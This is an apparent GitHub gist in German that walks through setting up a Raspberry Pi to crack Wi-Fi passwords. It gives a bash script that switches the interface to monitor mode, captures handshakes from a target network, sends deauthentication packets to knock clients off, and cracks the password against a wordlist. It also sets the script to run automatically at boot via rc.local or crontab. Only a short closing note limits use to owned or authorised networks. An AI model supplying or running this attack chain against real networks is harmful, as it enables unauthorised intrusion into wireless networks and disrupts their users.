https://gist.github.com/DanilAndreev/77036b5f7a7dc656c54aacb31140c22c
## Schritt 1: Vorbereitung

1. **Aircrack-ng installieren:**
    
    bash
    
    `sudo apt update sudo apt install aircrack-ng`
    
2. **Wireshark installieren:**
    
    bash
    
    `sudo apt update sudo apt install wireshark sudo usermod -a -G wireshark pi`
    
3. **Benutzer zur Wireshark-Gruppe hinzufügen:**  
    Nach der Installation von Wireshark müssen Sie sich ab- und wieder anmelden oder den Raspberry Pi neu starten.
    

## Schritt 2: Script erstellen

Erstellen Sie ein neues Script, das die Programme startet und das WLAN in den Monitor-Modus setzt. Öffnen Sie einen Texteditor und fügen Sie den folgenden Code ein:

bash

`#!/bin/bash # WLAN-Interface in Monitor-Modus setzen sudo airmon-ng start wlan0 # Airodump-ng starten, um den Authentifizierungs-Handshake zu erfassen sudo airodump-ng -c 1 -w capture --bssid <BSSID> wlan0mon & # Deauthentifizierung eines Clients, um den Handshake zu erzwingen sudo aireplay-ng -0 2 -a <BSSID> wlan0mon # Aircrack-ng starten, um das Passwort zu knacken sudo aircrack-ng -w /path/to/wordlist capture-01.cap # Wireshark starten sudo wireshark &`

Ersetzen Sie `<BSSID>` durch die BSSID des Zielnetzwerks und `/path/to/wordlist` durch den Pfad zu Ihrer Passwortliste.

## Schritt 3: Script automatisch starten

Um das Script beim Start des Raspberry Pi auszuführen, können Sie es in die Datei `/etc/rc.local` einfügen oder einen Cron-Job erstellen.

## Methode 1: rc.local

1. Öffnen Sie die Datei `/etc/rc.local` mit einem Editor:
    
    bash
    
    `sudo nano /etc/rc.local`
    
2. Fügen Sie den Pfad zu Ihrem Script ein, bevor `exit 0` steht:
    
    bash
    
    `sudo /path/to/your/script.sh &`
    
3. Speichern und schließen Sie die Datei.
    

## Methode 2: Crontab

1. Öffnen Sie den Crontab-Editor:
    
    bash
    
    `sudo crontab -e`
    
2. Fügen Sie die folgende Zeile am Ende hinzu:
    
    bash
    
    `@reboot sudo /path/to/your/script.sh &`
    
3. Speichern und schließen Sie die Datei.
    

## Schritt 4: Reboot

Starten Sie Ihren Raspberry Pi neu, um das Script automatisch auszuführen.

## Hinweis

- **Rechtliche Aspekte:** Stellen Sie sicher, dass Sie die rechtlichen Aspekte beachten und nur Netzwerke sniffen und knacken, die Ihnen gehören oder für die Sie die Erlaubnis haben.
    
- **Sicherheit:** Verwenden Sie starke Passwörter und sichere Netzwerke, um Angriffe zu verhindern.
- 